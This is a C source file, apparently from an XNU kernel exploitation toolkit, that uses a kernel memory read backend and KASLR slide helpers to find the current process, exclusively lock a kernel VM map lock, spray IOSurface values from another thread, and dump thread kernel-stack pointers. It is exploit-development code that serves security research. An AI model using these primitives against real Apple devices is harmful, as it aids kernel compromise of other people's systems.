//
//  main.c
//  locker
//
//  Created by admin on 11/25/21.
//

#include <assert.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/sysctl.h>
#include <sys/errno.h>
#include <gym_client.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include <dispatch/dispatch.h>

#include "kmem.h"
#include "kmem_gym.h"
#include "slider.h"
#include "platform_params.h"
#include "allocator_msdosfs.h"

#include "xnu_proc.h"
#include "util_lck_rw.h"
#include "util_dispatch.h"


IOSurfaceRef iosurface_create(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    xe_assert(surface != NULL);
    
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    return surface;
}

void iosurface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
    for (size_t i=0; i<count; i++) {
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "xe_key_%lu", i + idx_start);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
        IOSurfaceSetValue(surface, key, value);
        CFRelease(key);
        CFRelease(value);
    }
}


int main(void) {
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_slider_init();
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
    uintptr_t proc = xe_xnu_proc_current_proc(kernproc);
    
    printf("proc: %p\n", (void*)proc);

    uintptr_t kheap_default = xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kh_large_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
    uintptr_t lck_rw = KMEM_OFFSET(kh_large_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
    printf("[INFO] locking %p\n", (void*)lck_rw);
    
    printf("[INFO] lock start\n");
    xe_util_lck_rw_t util_lock = xe_util_lck_rw_lock_exclusive(proc, lck_rw);
    printf("[INFO] lock done\n");
    
    dispatch_async(xe_dispatch_queue(), ^() {
        IOSurfaceRef surface = iosurface_create();
        size_t array_len = (16384 * 3) / 8;
        printf("[INFO] begin set value\n");
        iosurface_add_values(surface, 0, array_len);
        printf("[INFO] done set value\n");
    });
    
    sleep(3);
    
    uintptr_t cursor = xe_kmem_read_uint64(KMEM_OFFSET(proc, TYPE_PROC_MEM_P_UTHLIST_OFFSET));
    while (cursor != 0) {
        uintptr_t thread = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_UTHREAD_MEM_UU_THREAD_OFFSET));
        uintptr_t kernel_stack = xe_kmem_read_uint64(KMEM_OFFSET(thread, TYPE_THREAD_MEM_KERNEL_STACK_OFFSET));
        int state = xe_kmem_read_int32(KMEM_OFFSET(thread, TYPE_THREAD_MEM_STATE_OFFSET));
        
        printf("thread: %p\t kernel stack: %p\t state: %d\n", (void*)thread, (void*)kernel_stack, state);
        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_UTHREAD_MEM_UU_LIST_OFFSET));
    }
    
    getpass("press enter to continue...\n");
    
    printf("[INFO] release start\n");
    xe_util_lck_rw_lock_done(&util_lock);
    printf("[INFO] release done\n");
    
    getpass("press enter to continue...\n");
    
    return 0;
}
